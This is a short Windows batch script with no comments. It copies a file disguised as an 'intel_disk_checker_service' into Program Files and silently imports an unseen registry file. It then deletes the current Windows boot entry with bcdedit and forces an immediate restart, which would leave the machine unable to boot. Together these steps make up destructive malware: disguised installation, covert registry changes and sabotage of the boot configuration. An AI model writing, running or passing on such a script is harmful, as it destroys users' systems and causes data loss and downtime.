copy "%~dp0\intel_disk_checker_service.bat" "C:\Program Files\intel_disk_checker_service.bat"
regedit /s "%~dp0\regdata.reg"
bcdedit /delete {current}
shutdown /r /t 0
